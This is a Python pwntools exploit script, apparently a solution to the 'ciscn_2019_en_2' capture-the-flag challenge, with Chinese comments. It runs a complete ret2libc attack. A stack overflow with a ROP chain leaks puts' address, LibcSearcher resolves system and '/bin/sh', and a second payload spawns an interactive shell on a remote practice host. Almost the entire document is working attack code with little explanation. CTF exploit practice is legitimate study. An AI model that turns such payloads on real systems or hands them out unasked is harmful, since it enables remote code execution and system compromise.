from pwn import *
from LibcSearcher import *

content = 0
context(os='linux', arch='amd64', log_level='debug')

ret = 0x4006b9      #靶机是ubuntu，所以需要栈平衡
elf = ELF('./ciscn_2019_en_2')

puts_plt = elf.plt["puts"] 
puts_got = elf.got['puts']
main_addr = elf.symbols["main"]

pop_rdi_ret = 0x400c83      #×64程序基本都存在的一个地址pop rdi；ret


def main():
	if content == 1:
		p = process('ciscn_2019_en_2')
	else:	
		p = remote('node4.buuoj.cn',27180)

	payload = b'a' * (0x50 + 8)
	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
	#print(payload)

	p.sendlineafter('Input your choice!\n', '1')
	p.sendlineafter('Input your Plaintext to be encrypted\n', payload)

	p.recvuntil('Ciphertext\n')	
	p.recvline()
	puts_addr = u64(p.recv(7)[:-1].ljust(8,b'\x00'))
	print(puts_addr)      #找出puts的地址

	libc = LibcSearcher('puts', puts_addr)

	libc_base   = puts_addr - libc.dump('puts')      #找出函数地址偏移量
	system_addr = libc_base + libc.dump('system')      #计算出system的在程序中的地址
	binsh_addr  = libc_base + libc.dump('str_bin_sh')	

	payload = b'a' * (0x50 + 8)
	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)

	p.sendlineafter('Input your choice!\n', '1')
	p.sendlineafter('Input your Plaintext to be encrypted\n', payload)

	p.interactive()

main()
